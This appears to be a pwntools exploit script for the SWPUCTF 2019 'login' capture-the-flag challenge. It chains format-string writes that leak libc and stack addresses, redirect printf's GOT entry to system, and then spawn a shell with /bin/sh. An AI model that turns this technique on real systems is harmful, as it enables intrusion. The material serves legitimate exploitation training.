from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27-32/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-32.so"
# p = process([ld_path, "./SWPUCTF_2019_login"], env={"LD_PRELOAD": libc_path})
p = remote("node4.buuoj.cn", 26987)

pro = ELF("./SWPUCTF_2019_login")
libc = ELF(libc_path)

printf_g = pro.got["printf"]
print("printf_g: ", hex(printf_g))


# format string vuln
name = "a"
p.sendlineafter("Please input your name: \n", name)

# leak libc and stack
passwd = "%6$p-%15$p"
p.sendlineafter("Please input your password: \n", passwd)
p.recvuntil("password: ")
stack = int(p.recvuntil("-", drop=True), 16)
print("leak: ", hex(stack))
info = int(p.recvuntil("\nTry", drop=True), 16)
print("leak: ", hex(info))

# count
base = info-libc.sym["__libc_start_main"]-241
print("base: ", hex(base))
system = base+libc.sym["system"]
print("system: ", hex(system))
addr = (stack-0x10+0x4) & 0xffff 

# alter next ebp to addr, the next ebp offset is 10
pad = "%{}c%6$hn".format(addr).encode("ISO-8859-1")
p.sendafter("again!\n", pad.ljust(0x32, b"\x00"))

# alter addr to printf_g
pad = "%{}c%10$hn".format(printf_g & 0xffff).encode("ISO-8859-1")
p.sendafter("again!\n", pad.ljust(0x32, b"\x00"))

# alter next ebp to addr+4
pad = "%{}c%6$hn".format(addr+4).encode("ISO-8859-1")
p.sendafter("again!\n", pad.ljust(0x32, b"\x00"))

# alter addr+4 to printf_g+2
pad = "%{}c%10$hn".format((printf_g + 2) & 0xffff).encode("ISO-8859-1")
p.sendafter("again!\n", pad.ljust(0x32, b"\x00"))

# alter printf_g to system
post = system & 0xffff
pre = system >> 16 & 0xffff 
pad = "%{}c%7$hn%{}c%8$hn".format(post, pre-post).encode("ISO-8859-1")
p.sendafter("again!\n", pad.ljust(0x32, b"\x00"))

# attack
p.sendafter("again!\n", b"/bin/sh\x00")

p.interactive()


